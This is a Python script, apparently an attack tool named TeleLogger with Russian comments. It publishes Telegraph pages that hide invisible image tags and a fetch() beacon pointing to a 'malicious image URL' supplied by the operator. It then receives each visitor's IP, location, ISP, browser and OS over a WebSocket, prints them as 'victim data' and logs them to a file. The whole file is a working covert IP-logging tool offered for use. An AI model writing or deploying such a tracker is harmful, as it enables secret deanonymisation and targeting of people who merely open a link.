#!/usr/bin/env python3
import asyncio
import websockets
import json
import requests
import base64
from telegraph import Telegraph
from datetime import datetime
import os

class TeleLogger:
    def __init__(self, express_url="ws://localhost:3000"):
        self.express_url = express_url
        self.telegraph = Telegraph()
        self.telegraph.create_account(short_name='TeleLogger')
        
    def create_telegraph_page(self, title, description, image_url):
        """Создает страницу Telegraph с вредоносным изображением"""
        
        # HTML контент с невидимым изображением
        content = f"""
        <html>
        <head>
            <meta charset="UTF-8">
            <title>{title}</title>
        </head>
        <body>
            <h1>{title}</h1>
            <p>{description}</p>
            <img src="{image_url}" style="display:none" width="1" height="1">
            <img src="{image_url}" width="0" height="0" style="position:absolute; visibility:hidden">
            <script>
                // Дополнительная отправка через fetch
                fetch('{image_url}', {{mode: 'no-cors'}});
            </script>
            <p>Loading content...</p>
        </body>
        </html>
        """
        
        # Создаем страницу
        response = self.telegraph.create_page(
            title=title,
            html_content=content,
            author_name="TeleLogger",
            author_url="https://t.me/TeleLogger"
        )
        
        return response['url']
    
    async def connect_to_express(self):
        """Подключается к Express серверу через WebSocket"""
        async with websockets.connect(self.express_url) as websocket:
            print(f"[+] Connected to Express server at {self.express_url}")
            
            # Получаем данные о жертвах в реальном времени
            async for message in websocket:
                data = json.loads(message)
                self.handle_victim_data(data)
    
    def handle_victim_data(self, data):
        """Обрабатывает полученные данные о жертве"""
        print("\n" + "="*50)
        print("[!] NEW VICTIM DATA RECEIVED!")
        print("="*50)
        print(f"IP: {data.get('ip')}")
        print(f"Country: {data.get('country')}")
        print(f"City: {data.get('city')}")
        print(f"ISP: {data.get('isp')}")
        print(f"Website: {data.get('website')}")
        print(f"Browser: {data.get('browser')}")
        print(f"OS: {data.get('os')}")
        print(f"User-Agent: {data.get('userAgent')}")
        print(f"Time: {data.get('timestamp')}")
        print("="*50)
        
        # Сохраняем в файл
        with open('victims.log', 'a') as f:
            f.write(json.dumps(data) + '\n')
    
    def run(self, title, description, image_url):
        """Запускает инструмент"""
        print("[+] Creating Telegraph page...")
        page_url = self.create_telegraph_page(title, description, image_url)
        print(f"[+] Page created: {page_url}")
        print(f"[+] Malicious image: {image_url}")
        print("[+] Waiting for victims...")
        
        # Запускаем WebSocket соединение
        asyncio.get_event_loop().run_until_complete(self.connect_to_express())

# CLI интерфейс
if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║         TeleLogger v1.0               ║
    ║    Telegram Logger Tool               ║
    ╚═══════════════════════════════════════╝
    """)
    
    title = input("[?] Enter page title: ")
    description = input("[?] Enter page description: ")
    image_url = input("[?] Enter malicious image URL: ")
    
    logger = TeleLogger()
    logger.run(title, description, image_url)